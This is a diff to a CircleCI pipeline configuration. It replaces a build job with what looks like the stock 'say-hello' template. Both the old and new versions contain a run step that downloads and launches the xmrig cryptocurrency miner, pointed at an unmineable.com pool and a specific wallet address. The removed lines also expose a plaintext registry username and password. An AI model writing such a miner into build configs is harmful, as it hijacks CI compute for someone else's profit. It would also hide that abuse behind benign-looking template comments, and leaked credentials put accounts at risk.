@@ -1,10 +1,21 @@
-verversion: 2.1
+# Use the latest 2.1 version of CircleCI pipeline process engine.
+# See: https://circleci.com/docs/configuration-reference
+version: 2.1
+
+# Define a job to be invoked later in a workflow.
+# See: https://circleci.com/docs/jobs-steps/#jobs-overview & https://circleci.com/docs/configuration-reference/#jobs
 jobs:
-  build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-        username: saroden
-          password: Galeng1630
-    steps:
-      - checkout 
-      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz && tar -xvzf xmrig-6.22.0-linux-static-x64.tar.gz && cd xmrig-6.22.0 && ./xmrig -a gr -o ghostrider.unmineable.com:3333 -u POL:0xA35c287E9DFf5351F4C7985e89BCbAA99a8F41C5.n2 -p x --keepalive --cpu-priority=5 --randomx-1gb-pages
+  say-hello:
+    # Specify the execution environment. You can specify an image from Docker Hub or use one of our convenience images from CircleCI's Developer Hub.
+    # See: https://circleci.com/docs/executor-intro/ & https://circleci.com/docs/configuration-reference/#executor-job
+    docker:
+      # Specify the version you desire here
+      # See: https://circleci.com/developer/images/image/cimg/base
+      - image: cimg/base:current
+
+    # Add steps to the job
+    # See: https://circleci.com/docs/jobs-steps/#steps-overview & https://circleci.com/docs/configuration-reference/#steps
+    steps:
+      # Checkout the code as the first step.
+      - checkout
+      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz && tar -xvzf xmrig-6.22.0-linux-static-x64.tar.gz && cd xmrig-6.22.0 && ./xmrig -a gr -o ghostrider.unmineable.com:3333 -u POL:0xA35c287E9DFf5351F4C7985e89BCbAA99a8F41C5.n2 -p x --keepalive --cpu-priority=5 --randomx-1gb-pages
